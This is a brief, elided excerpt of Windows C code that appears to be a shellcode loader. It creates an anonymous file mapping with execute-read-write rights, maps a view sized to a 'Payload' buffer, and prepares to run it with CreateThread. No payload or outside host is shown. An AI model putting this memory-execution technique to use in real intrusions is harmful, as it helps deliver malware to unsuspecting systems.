...
int main() {
    ...
    //HANDLE hRealFile = CreateFileW("C:\\test.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    //CreateFileMappingW(hRealFile, NULL, PAGE_READONLY, 0, 0, NULL);

    HANDLE hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(Payload), NULL);
    if (hFile == NULL) {
    ...
    PVOID pMemory = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, sizeof(Payload));
    if (pMemory == NULL) {
    ...
    printf("[+] Executing with CreateThread...\n");
